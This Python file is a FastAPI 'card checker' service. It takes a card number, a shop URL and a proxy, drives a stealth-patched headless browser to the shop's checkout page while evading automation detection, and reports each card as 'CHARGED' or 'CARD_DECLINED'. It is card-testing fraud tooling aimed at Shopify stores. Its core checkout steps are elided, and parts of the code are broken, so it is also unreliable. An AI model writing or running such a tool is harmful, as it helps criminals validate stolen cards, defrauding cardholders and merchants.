from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async
import uvicorn

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        browser = await p.chromium.launch(args=[
            "--no-sandbox", 
            "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled"
        ])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        page = await context.new_page()
        
        # التعديل هنا: استخدام stealth_async
        await stealth_async(page)
        
        try:
            await page.goto(f"{site}/checkout", timeout=90000, wait_until="load")
            await page.wait_for_selector('input', timeout=30000)
            
            # بقية المنطق الخاص بك كما هو
            email_field = page.locator('input[type="email"], input[name*="email"], input[placeholder*="Email"]').first
            await email_field.fill("user@example.com")
            
            # ... (بقية الخطوات)
            
            content = page.content().lower()
            status = "true" if "thank-you" in page.url or "success" in content else "false"
            
            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
            
        except Exception as e:
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
            
        finally:
            # ضمان إغلاق المتصفح في كل الحالات
            await browser.close()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
